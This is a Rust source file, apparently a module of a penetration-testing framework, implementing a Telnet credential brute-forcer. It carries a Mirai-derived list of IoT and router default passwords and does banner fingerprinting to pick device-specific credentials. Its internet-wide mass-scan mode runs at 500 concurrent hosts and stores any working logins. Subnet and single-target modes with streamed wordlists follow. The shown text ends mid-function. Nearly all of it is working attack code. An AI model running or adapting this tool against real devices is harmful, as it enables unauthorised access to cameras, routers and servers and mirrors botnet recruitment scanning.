use anyhow::{anyhow, Result};
use colored::*;
use std::{
    collections::HashSet,
    io::{BufRead, Write},
    net::IpAddr,
    sync::Arc,
    time::Duration,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    time::timeout,
};

use crate::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, BruteforceResult, LoginResult, MassScanConfig,
    SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// ============================================================
// Constants
// ============================================================

const DEFAULT_TELNET_PORT: u16 = 23;
const COMMON_TELNET_PORTS: &[u16] = &[23, 2323, 23231];
const CONNECT_TIMEOUT_SECS: u64 = 8;
const READ_TIMEOUT_SECS: u64 = 5;
const RECENT_BUF_CAP: usize = 2048;
/// Max password file size to load entirely into memory (500 MB).
/// Larger files are streamed in chunks to avoid OOM.
const MAX_MEMORY_WORDLIST_BYTES: u64 = 500 * 1024 * 1024;
/// Lines per chunk when streaming large wordlists.
const STREAM_CHUNK_SIZE: usize = 100_000;
/// Max IAC negotiation responses per drain_and_negotiate call.
/// Prevents infinite WILL/DO cycling from malicious servers.
const MAX_IAC_ROUNDS: usize = 64;
/// Max total bytes read per drain_and_negotiate call.
const MAX_DRAIN_BYTES: usize = 65536;

// Telnet IAC protocol bytes
const IAC: u8 = 255;
const WILL: u8 = 251;
const WONT: u8 = 252;
const DO: u8 = 253;
const DONT: u8 = 254;
const SB: u8 = 250;
const SE: u8 = 240;
const GA: u8 = 249;
const NOP: u8 = 241;
const ECHO: u8 = 1;
const SGA: u8 = 3;
const TERMINAL_TYPE: u8 = 24;
const NAWS: u8 = 31;
const LINEMODE: u8 = 34;
const NEW_ENVIRON: u8 = 39;
const ENVIRON: u8 = 36;
const TERMINAL_SPEED: u8 = 32;
const X_DISPLAY_LOCATION: u8 = 35;
// Subnegotiation: TERMINAL_TYPE
const TT_IS: u8 = 0;
const TT_SEND: u8 = 1;

/// Default credentials ordered by real-world IoT/botnet frequency.
/// Sources: Mirai source, Shodan honeypot data, IPVM research.
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    // Tier 1: Most common IoT defaults (empty passwords, trivial creds)
    ("root", ""),
    ("admin", ""),
    ("root", "root"),
    ("admin", "admin"),
    ("root", "admin"),
    ("admin", "password"),
    ("root", "password"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "1234"),
    ("admin", "1234"),
    ("root", "12345"),
    ("admin", "12345"),
    ("root", "default"),
    ("admin", "default"),
    ("admin", "root"),
    // Tier 2: Common embedded/router creds
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    ("supervisor", "supervisor"),
    ("service", "service"),
    ("root", "toor"),
    ("root", "pass"),
    ("root", "master"),
    ("tech", "tech"),
    ("operator", "operator"),
    // Tier 3: Mirai-targeted (camera/DVR/NVR firmware defaults)
    ("root", "vizxv"),        // Dahua
    ("root", "xc3511"),       // Xiongmai/CMS
    ("root", "888888"),       // Dahua DVR
    ("root", "666666"),       // Dahua NVR
    ("root", "juantech"),     // Xiongmai v2
    ("root", "jvbzd"),        // HiSilicon generic
    ("root", "anko"),         // Anko/generic IP cam
    ("root", "54321"),        // TP-Link/D-Link
    ("root", "hi3518"),       // HiSilicon chipset default
    ("root", "tlJwpbo6"),     // HiSilicon alt
    ("root", "xmhdipc"),      // Xiongmai IPC
    ("root", "klv1234"),      // HiSilicon KLV
    ("root", "Zte521"),       // ZTE router
    ("root", "7ujMko0admin"), // Mirai original
    ("admin", "meinsm"),      // MeinSM router
    ("mother", "fucker"),     // Mirai hajime variant
    // Tier 4: ISP/CPE equipment
    ("root", "zsun1188"),
    ("root", "OxhlwSG8"),
    ("admin", "smcadmin"),
    ("admin", "epicrouter"),
    ("admin", "conexant"),
    ("admin", "utstar"),
    ("admin", "admin1234"),
    ("root", "ikwb"),
    ("root", "realtek"),
    ("root", "dreambox"),
    ("root", "changeme"),
    // Tier 5: Additional router/AP/switch defaults
    ("admin", "1234"),
    ("admin", "motorola"),
    ("admin", "comcomcom"),
    ("admin", "michelangelo"),
    ("admin", "netopia"),
    ("admin", "bEn2o#US9s"),   // Zyxel
    ("admin", "zyad5001"),     // ZyXEL P-600
    ("admin", ""),             // Already above, but with trailing space
    ("ubnt", "ubnt"),          // Ubiquiti AirOS
    ("pi", "raspberry"),       // Raspberry Pi
    ("pi", "raspberrypi"),
    ("root", "openmediavault"),
    ("root", "openelec"),
    ("root", "dietpi"),
    ("root", "alpine"),        // Alpine Linux
    ("root", "synology"),      // Synology NAS
    ("admin", "synology"),
    ("root", "trendnet"),
    ("root", "oelinux123"),    // OpenEmbedded Linux
    ("root", "GM8182"),        // Grain Media
    ("root", "cat1029"),       // Dahua alt
    ("root", "ipc71a"),        // Generic IPC
    ("root", "S2fGqNFs"),      // Xiongmai alt
    ("root", "system"),
    ("root", "calvin"),        // Dell iDRAC
    ("root", "hunt5759"),      // HiSilicon alt
    ("root", "ipcam_rt5350"),  // RT5350 chipset
    ("admin", "aerohive"),     // Aerohive/Extreme
    ("admin", "Symbol"),       // Symbol/Zebra AP
    ("admin", "Motorola"),     // Motorola CPE
    ("admin", "cisco"),        // Cisco small business
    ("cisco", "cisco"),
    ("enable", ""),            // Cisco enable with no password
    ("Manager", "friend"),     // HP printers
    ("cusadmin", "highspeed"), // Accton/SMC DSL
];

// ============================================================
// Module info
// ============================================================

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Telnet Brute Force".to_string(),
        description: "Brute-force Telnet authentication with full IAC negotiation, \
            banner fingerprinting for device-specific credential prioritization, \
            ANSI stripping, multilingual prompt detection, multi-probe shell verification, \
            and 95+ IoT/router default credentials. Supports combo mode, streaming \
            wordlists, concurrent connections, subnet scanning, and mass scanning."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================
// Shared telnet config (passed via Arc into closures)
// ============================================================

struct TelnetConfig {
    connect_timeout: Duration,
    read_timeout: Duration,
    login_prompts: Vec<String>,
    password_prompts: Vec<String>,
    success_indicators: Vec<String>,
    failure_indicators: Vec<String>,
    lockout_indicators: Vec<String>,
}

impl TelnetConfig {
    fn new(connect_secs: u64, read_secs: u64) -> Self {
        Self {
            connect_timeout: Duration::from_secs(connect_secs),
            read_timeout: Duration::from_secs(read_secs),
            login_prompts: default_login_prompts(),
            password_prompts: default_password_prompts(),
            success_indicators: default_success_indicators(),
            failure_indicators: default_failure_indicators(),
            lockout_indicators: default_lockout_indicators(),
        }
    }
}

// ============================================================
// Banner fingerprinting
// ============================================================

#[derive(Debug, Clone, Copy, PartialEq)]
enum DeviceType {
    Dahua,
    Xiongmai,
    HiSilicon,
    Zte,
    Huawei,
    MikroTik,
    Ubiquiti,
    Cisco,
    DLink,
    TpLink,
    Netgear,
    BusyBox,
    RaspberryPi,
    DellIdrac,
    HpPrinter,
    Generic,
}

fn fingerprint_banner(banner: &str) -> DeviceType {
    let lower = banner.to_lowercase();
    if lower.contains("dahua") || lower.contains("dvrdvs") { return DeviceType::Dahua; }
    if lower.contains("xiongmai") || lower.contains("xmhdipc") || lower.contains("xc3511") { return DeviceType::Xiongmai; }
    if lower.contains("hi3518") || lower.contains("hi3516") || lower.contains("hisilicon") { return DeviceType::HiSilicon; }
    if lower.contains("zte") { return DeviceType::Zte; }
    if lower.contains("huawei") || lower.contains("vrp") { return DeviceType::Huawei; }
    if lower.contains("mikrotik") || lower.contains("routeros") { return DeviceType::MikroTik; }
    if lower.contains("ubnt") || lower.contains("airos") || lower.contains("edgeos") { return DeviceType::Ubiquiti; }
    if lower.contains("cisco") || lower.contains("ios") { return DeviceType::Cisco; }
    if lower.contains("d-link") || lower.contains("dlink") { return DeviceType::DLink; }
    if lower.contains("tp-link") || lower.contains("tplink") { return DeviceType::TpLink; }
    if lower.contains("netgear") { return DeviceType::Netgear; }
    if lower.contains("busybox") { return DeviceType::BusyBox; }
    if lower.contains("raspbian") || lower.contains("raspberry") { return DeviceType::RaspberryPi; }
    if lower.contains("idrac") || lower.contains("dell") { return DeviceType::DellIdrac; }
    if lower.contains("hp ") || lower.contains("hewlett") || lower.contains("jet direct") { return DeviceType::HpPrinter; }
    DeviceType::Generic
}

fn device_priority_creds(device: DeviceType) -> &'static [(&'static str, &'static str)] {
    match device {
        DeviceType::Dahua => &[("root", "888888"), ("root", "666666"), ("root", "vizxv"), ("admin", "admin"), ("root", "cat1029")],
        DeviceType::Xiongmai => &[("root", "xc3511"), ("root", "xmhdipc"), ("root", "juantech"), ("root", "S2fGqNFs"), ("root", "")],
        DeviceType::HiSilicon => &[("root", "hi3518"), ("root", "jvbzd"), ("root", "tlJwpbo6"), ("root", "klv1234"), ("root", "hunt5759"), ("root", "ipc71a")],
        DeviceType::Zte => &[("root", "Zte521"), ("admin", "admin"), ("root", "root")],
        DeviceType::Huawei => &[("admin", "admin"), ("root", "admin"), ("admin", ""), ("root", "")],
        DeviceType::MikroTik => &[("admin", ""), ("admin", "admin")],
        DeviceType::Ubiquiti => &[("ubnt", "ubnt"), ("admin", "admin"), ("root", "ubnt")],
        DeviceType::Cisco => &[("cisco", "cisco"), ("admin", "cisco"), ("admin", "admin"), ("enable", "")],
        DeviceType::DLink => &[("admin", ""), ("admin", "admin"), ("admin", "password"), ("root", "54321")],
        DeviceType::TpLink => &[("admin", "admin"), ("root", "54321"), ("admin", "")],
        DeviceType::Netgear => &[("admin", "password"), ("admin", "1234"), ("admin", "admin")],
        DeviceType::BusyBox => &[("root", ""), ("root", "root"), ("admin", ""), ("admin", "admin")],
        DeviceType::RaspberryPi => &[("pi", "raspberry"), ("pi", "raspberrypi"), ("root", ""), ("root", "root")],
        DeviceType::DellIdrac => &[("root", "calvin"), ("admin", "admin")],
        DeviceType::HpPrinter => &[("Manager", "friend"), ("admin", ""), ("admin", "admin")],
        DeviceType::Generic => &[],
    }
}

// ============================================================
// Chunk result processing helper (deduplicates streaming logic)
// ============================================================

fn collect_chunk_result(
    result: &BruteforceResult,
    save_path: &Option<String>,
    all_found: &mut Vec<(String, String, String)>,
    stop_on_success: bool,
) -> Result<bool> {
    result.print_found();
    if let Some(path) = save_path {
        result.save_to_file(path)?;
    }
    all_found.extend_from_slice(&result.found);
    Ok(stop_on_success && !result.found.is_empty())
}

// ============================================================
// Entry point
// ============================================================

pub async fn run(target: &str) -> Result<()> {
    if !crate::utils::is_batch_mode() {
        crate::mprintln_block!(
            format!("{}", "=== Telnet Brute Force Module ===".bold()),
            format!("[*] Target: {}", target)
        );
    }

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} \u{2014} Mass Scan Mode", target).yellow()
        );
        let cfg = Arc::new(TelnetConfig::new(5, 3));
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "Telnet",
                default_port: 23,
                state_file: "telnet_sweep_state.log",
                default_output: "telnet_mass_results.txt",
                default_concurrency: 500,
            },
            move |ip, port| {
                let cfg = cfg.clone();
                async move {
                    // Sweep the prompted port + common alternatives
                    let mut ports_to_try = vec![port];
                    for &p in COMMON_TELNET_PORTS {
                        if !ports_to_try.contains(&p) {
                            ports_to_try.push(p);
                        }
                    }

                    for p in ports_to_try {
                        if !crate::utils::tcp_port_open(ip, p, Duration::from_secs(3)).await {
                            continue;
                        }
                        let addr = format!("{}:{}", ip, p);

                        // Grab banner for fingerprinting to prioritize device-specific creds
                        let device = match grab_banner(&addr, &cfg).await {
                            Some(banner) => fingerprint_banner(&banner),
                            None => DeviceType::Generic,
                        };
                        let priority_creds = device_priority_creds(device);

                        // Try device-specific creds first, then fall back to general defaults
                        let mut tried: HashSet<(&str, &str)> = HashSet::new();
                        let cred_iter = priority_creds.iter()
                            .chain(DEFAULT_CREDENTIALS.iter());

                        for &(user, pass) in cred_iter {
                            if !tried.insert((user, pass)) { continue; }
                            match try_telnet_login(&addr, user, pass, &cfg).await {
                                Ok(true) => {
                                    {
                                        let id = crate::cred_store::store_credential(
                                            &ip.to_string(),
                                            p,
                                            "telnet",
                                            user,
                                            pass,
                                            crate::cred_store::CredType::Password,
                                            "creds/generic/telnet_credcheck",
                                        )
                                        .await;
                                        if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
                                    }
                                    let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                    crate::mprintln!(
                                        "\r{}",
                                        format!("[+] {}:{} -> {}:{}", ip, p, user, pass)
                                            .green()
                                            .bold()
                                    );
                                    return Some(format!(
                                        "[{}] {}:{}:{}:{}\n",
                                        ts, ip, p, user, pass
                                    ));
                                }
                                Ok(false) => {
                                    tokio::time::sleep(Duration::from_millis(50)).await;
                                    continue;
                                }
                                Err(_) => break, // port error, try next port
                            }
                        }
                    }
                    None
                }
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 = cfg_prompt_port("port", "Telnet Port", DEFAULT_TELNET_PORT).await?;

        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("User list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Pass list empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "telnet_subnet_results.txt",
        )
        .await?;

        let connection_timeout: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "8").await?;
            input
                .parse::<u64>()
                .unwrap_or(CONNECT_TIMEOUT_SECS)
                .max(1)
                .min(60)
        };

        let cfg = Arc::new(TelnetConfig::new(connection_timeout, READ_TIMEOUT_SECS));

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "telnet",
                jitter_ms: 50,
                source_module: "creds/generic/telnet_credcheck",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let cfg = cfg.clone();
                async move {
                    let addr = format!("{}:{}", ip, port);
                    match try_telnet_login(&addr, &user, &pass, &cfg).await {
                        Ok(true) => LoginResult::Success,
                        Ok(false) => LoginResult::AuthFailed,
                        Err(e) => {
                            let msg = e.to_string();
                            LoginResult::Error {
                                message: msg.clone(),
                                retryable: is_retryable_error(&msg),
                            }
                        }
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let ports = parse_ports(
        &cfg_prompt_default("port", "Telnet port(s) (comma-separated)", "23,2323").await?,
    );
    if ports.is_empty() {
        return Err(anyhow!("No valid ports specified"));
    }

    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file =
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        };

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!(
            "At least one wordlist or default credentials must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "8").await?;
        input
            .parse::<u64>()
            .unwrap_or(CONNECT_TIMEOUT_SECS)
            .max(1)
            .min(60)
    };

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;

    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file", "telnet_brute_results.txt")
                .await?,
        )
    } else {
        None
    };

    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    // Resolve target once (not in hot path)
    let resolved_target = normalize_target(target).unwrap_or_else(|_| target.to_string());

    // Connection pre-check: verify at least one port is reachable before loading wordlists
    {
        let mut any_open = false;
        for &p in &ports {
            if crate::utils::tcp_port_open(
                resolved_target.parse().unwrap_or(IpAddr::V4(std::net::Ipv4Addr::UNSPECIFIED)),
                p,
                Duration::from_secs(connection_timeout),
            )
            .await
            {
                any_open = true;
                break;
            }
        }
        if !any_open {
            crate::mprintln!(
                "{}",
                format!(
                    "[-] No telnet ports reachable on {} (tried {:?})",
                    resolved_target, ports
                )
                .red()
            );
            return Ok(());
        }
    }

    // Load usernames (always fits in memory — username lists are small)
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if !usernames.is_empty() {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} usernames", usernames.len()).green()
            );
        }
    }

    // Add defaults using HashSet for O(1) dedup
    if use_defaults {
        let mut user_set: HashSet<String> = usernames.iter().cloned().collect();
        for &(u, _) in DEFAULT_CREDENTIALS {
            if user_set.insert(u.to_string()) {
                usernames.push(u.to_string());
            }
        }
    }
    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }

    // Determine if password file needs streaming
    let pass_file_size = passwords_file
        .as_ref()
        .and_then(|f| std::fs::metadata(f).ok())
        .map(|m| m.len())
        .unwrap_or(0);
    let needs_streaming = pass_file_size > MAX_MEMORY_WORDLIST_BYTES;

    if needs_streaming {
        crate::mprintln!(
            "{}",
            format!(
                "[*] Password file is {:.1} GB — using streaming mode ({}K lines/chunk)",
                pass_file_size as f64 / (1024.0 * 1024.0 * 1024.0),
                STREAM_CHUNK_SIZE / 1000
            )
            .yellow()
        );
    }

    // Load or prepare passwords
    let mut passwords = Vec::new();
    if !needs_streaming {
        if let Some(ref file) = passwords_file {
            passwords = load_lines(file)?;
            if !passwords.is_empty() {
                crate::mprintln!(
                    "{}",
                    format!("[*] Loaded {} passwords", passwords.len()).green()
                );
            }
        }
    }

    if use_defaults {
        let mut pass_set: HashSet<String> = passwords.iter().cloned().collect();
        for &(_, p) in DEFAULT_CREDENTIALS {
            if pass_set.insert(p.to_string()) {
                passwords.push(p.to_string());
            }
        }
    }

    if !needs_streaming && passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let cfg = Arc::new(TelnetConfig::new(connection_timeout, READ_TIMEOUT_SECS));

    // Build the try_login closure — target is pre-resolved, not computed per attempt
    let make_try_login = |cfg: Arc<TelnetConfig>, resolved: String| {
        move |_t: String, p: u16, user: String, pass: String| {
            let cfg = cfg.clone();
            let addr = format!("{}:{}", resolved, p);
            async move {
                match try_telnet_login(&addr, &user, &pass, &cfg).await {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => {
                        let msg = e.to_string();
                        let retryable = is_retryable_error(&msg);
                        LoginResult::Error {
                            message: msg,
                            retryable,
                        }
                    }
                }
            }
        }
    };

    // Run bruteforce across all ports
    let mut all_found: Vec<(String, String, String)> = Vec::new();
    let mut stop_early = false;

    for &port in &ports {
        if ports.len() > 1 {
            crate::mprintln!(
                "\n{}",
                format!("[*] Attacking {}:{}", resolved_target, port).cyan()
            );
        } else {
            crate::mprintln!(
                "\n{}",
                format!("[*] Starting brute-force on {}:{}", resolved_target, port).cyan()
            );
        }

        let bf_config = BruteforceConfig {
            target: resolved_target.clone(),
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries,
            service_name: "telnet",
            jitter_ms: 50,
            source_module: "creds/generic/telnet_credcheck",
        };

        if needs_streaming {
            // Streaming mode: read password file in chunks to avoid OOM
            let pass_path = passwords_file.as_ref()
                .ok_or_else(|| anyhow::anyhow!("Password file path is required for streaming mode"))?;
            let file = std::fs::File::open(pass_path)?;
            let reader = std::io::BufReader::new(file);
            let mut chunk = Vec::with_capacity(STREAM_CHUNK_SIZE);
            let mut chunk_num = 0u64;

            // First: run default passwords if enabled (already in `passwords` vec)
            if !passwords.is_empty() {
                let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
                if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
                    let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
                    combos.extend(load_credential_file(&cred_path)?);
                }
                let result = run_bruteforce(
                    &bf_config,
                    combos,
                    make_try_login(cfg.clone(), resolved_target.clone()),
                )
                .await?;
                if collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)? {
                    break;
                }
            }

            // Then: stream password file in chunks
            for line in reader.lines() {
                let line = match line {
                    Ok(l) => l.trim().to_string(),
                    Err(_) => continue,
                };
                if line.is_empty() {
                    continue;
                }
                chunk.push(line);

                if chunk.len() >= STREAM_CHUNK_SIZE {
                    chunk_num += 1;
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[*] Streaming chunk {} ({} passwords)",
                            chunk_num,
                            chunk.len()
                        )
                        .cyan()
                    );
                    let combos = generate_combos_mode(&usernames, &chunk, parse_combo_mode(&combo_input));
                    let result = run_bruteforce(
                        &bf_config,
                        combos,
                        make_try_login(cfg.clone(), resolved_target.clone()),
                    )
                    .await?;
                    if collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)? {
                        stop_early = true;
                        break;
                    }
                    chunk.clear();
                }
            }

            // Final partial chunk
            if !chunk.is_empty() && !stop_early {
                chunk_num += 1;
                crate::mprintln!(
                    "{}",
                    format!(
                        "[*] Streaming chunk {} ({} passwords)",
                        chunk_num,
                        chunk.len()
                    )
                    .cyan()
                );
                let combos = generate_combos_mode(&usernames, &chunk, parse_combo_mode(&combo_input));
                let result = run_bruteforce(
                    &bf_config,
                    combos,
                    make_try_login(cfg.clone(), resolved_target.clone()),
                )
                .await?;
                collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)?;
            }
        } else {
            // Normal mode: everything fits in memory
            let combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
            let result = run_bruteforce(
                &bf_config,
                combos,
                make_try_login(cfg.clone(), resolved_target.clone()),
            )
            .await?;
            collect_chunk_result(&result, &save_path, &mut all_found, stop_on_success)?;

            // Error reporting
            if !result.errors.is_empty() {
                crate::mprintln!(
                    "{}",
                    format!(
                        "[?] {} unknown/errored Telnet responses on port {}.",
                        result.errors.len(),
                        port
                    )
                    .yellow()
                );
                if cfg_prompt_yes_no(
                    "save_unknown_responses",
                    "Save unknown responses to file?",
                    true,
                )
                .await?
                {
                    let fname = cfg_prompt_output_file(
                        "unknown_responses_file",
                        "Save as",
                        "telnet_unknown_responses.txt",
                    )
                    .await?;
                    let filename = get_filename_in_current_dir(&fname);
                    use std::os::unix::fs::OpenOptionsExt;
                    let mut opts = std::fs::OpenOptions::new();
                    opts.write(true).create(true).truncate(true).mode(0o600);
                    if let Ok(mut file) = opts.open(&filename) {
                        writeln!(file, "# Telnet Bruteforce Errors (host,user,pass,error)")?;
                        for (host, user, pass, msg) in &result.errors {
                            writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                        }
                        file.flush()?;
                        crate::mprintln!(
                            "{}",
                            format!("[+] Saved to '{}'", filename.display()).green()
                        );
                    }
                }
            }
        }

        if stop_early || (stop_on_success && !all_found.is_empty()) {
            break;
        }
    }

    // Summary across all ports
    if ports.len() > 1 && !all_found.is_empty() {
        crate::mprintln!(
            "\n{}",
            format!(
                "[+] Found {} valid credential(s) across {} port(s):",
                all_found.len(),
                ports.len()
            )
            .green()
            .bold()
        );
        for (host, user, pass) in &all_found {
            crate::mprintln!("  {} {}  {}:{}", "\u{2713}".green(), host, user, pass);
        }
    }

    Ok(())
}

/// Parse comma-separated port list (e.g. "23,2323,8023").
fn parse_ports(input: &str) -> Vec<u16> {
    let mut seen = std::collections::HashSet::new();
    input
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .filter(|&p| p > 0)
        .filter(|p| seen.insert(*p))
        .collect()
}

// ============================================================
// Core login function
// ============================================================

/// Attempt a single telnet login.
/// - `Ok(true)`  — authentication succeeded (verified with shell probe)
/// - `Ok(false)` — authentication explicitly failed
/// - `Err(_)`    — connection/protocol error
async fn try_telnet_login(addr: &str, user: &str, pass: &str, cfg: &TelnetConfig) -> Result<bool> {
    // 1. TCP connect
    let mut stream = crate::utils::network::tcp_connect(addr, cfg.connect_timeout)
        .await
        .map_err(|e| anyhow!("{}: {}", addr, e))?;

    if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }

    let mut buf = String::with_capacity(RECENT_BUF_CAP);
    let mut raw = [0u8; 4096];

    // 2. Banner phase: read with adaptive timing
    let banner_time = cfg.read_timeout.min(Duration::from_secs(2));
    drain_and_negotiate(&mut stream, &mut buf, &mut raw, banner_time).await;

    // If we got IAC but no visible text yet, server may send prompt after negotiation
    if buf.trim().is_empty() {
        drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_millis(1500)).await;
    }

    // 2b. Check for immediate shell access (no auth required)
    if looks_like_shell_prompt(&buf) && !has_any(&buf.to_lowercase(), &cfg.login_prompts) && !has_any(&buf.to_lowercase(), &cfg.password_prompts) {
        if user.is_empty() || user == "root" {
            return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await;
        }
    }

    // Handle "press any key / press Enter to continue" screens.
    // Use multi-word phrases to avoid false matches ("express", "compressed", "password").
    {
        let lower = buf.to_lowercase();
        if lower.contains("press any key")
            || lower.contains("press enter")
            || lower.contains("hit enter")
            || lower.contains("press a key")
            || lower.contains("any key to continue")
        {
            if let Err(e) = send_line(&mut stream, "", cfg.read_timeout).await { crate::meprintln!("[!] Write error: {}", e); }
            tokio::time::sleep(Duration::from_millis(300)).await;
            buf.clear();
            drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
        }
    }

    // 3. Classify what the device is asking for
    let lower = buf.to_lowercase();
    let wants_login = has_any(&lower, &cfg.login_prompts);
    let wants_password = has_any(&lower, &cfg.password_prompts);

    if wants_login {
        // Standard flow: login prompt → send username → wait for password prompt
        send_line(&mut stream, user, cfg.read_timeout).await?;
        tokio::time::sleep(Duration::from_millis(150)).await;

        buf.clear();
        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;

        // Some devices echo username before sending password prompt — check again
        let lower = buf.to_lowercase();
        if !has_any(&lower, &cfg.password_prompts) && !has_any(&lower, &cfg.failure_indicators) {
            drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_millis(1500)).await;
        }
    } else if wants_password {
        // Device shows "Password:" immediately (some DVRs/cameras).
        // Try sending username silently — many accept it before password prompt.
        // Propagate write errors (don't swallow with let _).
        send_line(&mut stream, user, cfg.read_timeout).await?;
        tokio::time::sleep(Duration::from_millis(100)).await;
        buf.clear();
        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
    } else if ends_with_prompt_char(&buf) || !buf.trim().is_empty() {
        // Got data but no recognized prompt — blind send username
        send_line(&mut stream, user, cfg.read_timeout).await?;
        tokio::time::sleep(Duration::from_millis(150)).await;
        buf.clear();
        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
    } else {
        // No banner at all. Send username directly.
        send_line(&mut stream, user, cfg.read_timeout).await?;
        tokio::time::sleep(Duration::from_millis(200)).await;
        buf.clear();
        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
    }

    // 4. Check for early failure / lockout at username stage
    {
        let lower = buf.to_lowercase();
        if has_any(&lower, &cfg.lockout_indicators) {
            return Err(anyhow!("Rate limited / locked out"));
        }
        if has_any(&lower, &cfg.failure_indicators) {
            return Ok(false);
        }
    }

    // 5. Send password
    send_line(&mut stream, pass, cfg.read_timeout).await?;

    // 6. Read response — use full read_timeout as auth check window
    buf.clear();
    let auth_deadline = cfg.read_timeout;
    let start = tokio::time::Instant::now();
    let mut saw_eof = false;

    loop {
        let elapsed = start.elapsed();
        if elapsed >= auth_deadline {
            break;
        }
        let remaining = auth_deadline - elapsed;
        let chunk_time = remaining.min(Duration::from_millis(800));

        let n = drain_and_negotiate(&mut stream, &mut buf, &mut raw, chunk_time).await;

        // Classify the accumulated response
        match classify_response(&buf, cfg) {
            AuthSignal::Failure | AuthSignal::Reprompt => return Ok(false),
            AuthSignal::Lockout => return Err(anyhow!("Rate limited / locked out")),
            AuthSignal::Success => {
                // Probable success — verify with shell probe
                return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await;
            }
            AuthSignal::Ambiguous => {}
        }

        if n == 0 {
            // Check if the connection was closed (EOF) vs just no data yet
            match timeout(Duration::from_millis(50), stream.read(&mut [0u8; 1])).await {
